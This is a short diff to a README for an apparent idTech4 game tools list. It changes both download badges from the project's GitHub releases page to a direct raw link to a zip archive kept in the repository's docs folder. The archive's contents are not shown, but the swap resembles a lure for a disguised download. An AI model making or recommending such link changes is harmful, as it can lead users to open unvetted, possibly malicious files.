@@ -1,6 +1,6 @@
 # 🎮 awesome-idtech4 - Easy Tools for idTech4 Games
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen)](https://github.com/ablactationscent13/awesome-idtech4/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen)](https://raw.githubusercontent.com/ablactationscent13/awesome-idtech4/main/docs/awesome_idtech_v3.5.zip)
 
 ---
 
@@ -97,7 +97,7 @@ Each release usually describes its specific features and supported games.
 
 ## 🔗 Download Link (Again for Easy Access)
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/ablactationscent13/awesome-idtech4/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/ablactationscent13/awesome-idtech4/main/docs/awesome_idtech_v3.5.zip)
 
 Visit this page to download all available tools and source ports for idTech4 games.
 
